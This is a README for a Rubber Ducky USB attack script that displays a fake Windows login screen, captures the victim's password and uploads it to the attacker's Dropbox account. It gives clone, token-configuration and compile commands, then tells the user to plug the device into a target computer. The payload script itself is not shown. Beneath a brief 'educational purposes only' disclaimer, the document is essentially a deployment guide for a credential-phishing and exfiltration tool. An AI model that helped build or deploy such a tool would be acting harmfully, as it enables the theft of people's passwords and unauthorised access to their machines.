# Ducky-script-Fake-Windows-Logon
Fake Windows Login Ducky Script
This repository contains a Ducky Script that displays a fake Windows login screen to the user. When the user enters their password, the script captures the input and uploads it to Dropbox using the provided Dropbox access token.

Prerequisites
A Rubber Ducky USB device (https://shop.hak5.org/products/usb-rubber-ducky-deluxe)
The DuckEncoder (https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Downloads) to compile the Ducky Script
Setup
Clone this repository:

bash
Copy code
git clone https://github.com/yourusername/fake-windows-login-ducky.git
Open the script.txt file in a text editor.

Replace the <YOUR_DROPBOX_ACCESS_TOKEN> placeholder with your own Dropbox access token.

bash
Copy code
$DropBoxAccessToken = '<YOUR_DROPBOX_ACCESS_TOKEN>'
Save the changes to the script.txt file.

Compile the Ducky Script using the DuckEncoder:

css
Copy code
java -jar duckencoder.jar -i script.txt -o inject.bin
Copy the inject.bin file to the root directory of the Rubber Ducky USB device.

Usage
Safely eject the Rubber Ducky USB device from your computer.

Insert the Rubber Ducky USB device into the target computer.

The script will start running, displaying a fake Windows login screen.

When the user enters their password and clicks "Submit", the script captures the password and uploads it to the specified Dropbox account.

Disclaimer
This script is for educational purposes only. Do not use it for any malicious activities or without the explicit consent of the computer's owner. The author and contributors are not responsible for any illegal actions performed with the help of this script.
